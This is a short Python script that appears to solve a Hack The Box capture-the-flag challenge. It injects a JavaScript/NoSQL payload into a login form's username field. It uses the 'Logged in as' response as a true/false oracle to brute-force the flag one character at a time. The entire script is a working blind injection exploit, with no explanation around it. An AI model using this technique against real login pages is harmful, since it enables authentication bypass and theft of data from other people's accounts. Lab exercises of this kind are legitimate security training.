#! /usr/bin/env python3

import requests
import json
import string

# Configuration
URL = "http://94.237.57.211:42939/index.php"
PROXY = {"http":"http://172.21.144.1:8081"}
HEADERS = {"Content-Type":"application/x-www-form-urlencoded"}
curly_brace = '{'
CHARSET = string.ascii_letters + string.digits

def oracle(t):
    r = requests.post(URL, headers=HEADERS, proxies=PROXY, data=f"username=\"||+(this.username.match('^{t}.*'))+||+\"\"==\"&password=test")
    return "Logged in as" in r.text

flag = "HTB{"
for _ in range(32):
    for c in CHARSET:
        if oracle(flag+c):
            flag += c
            print(f"Current flag: {flag}")
            break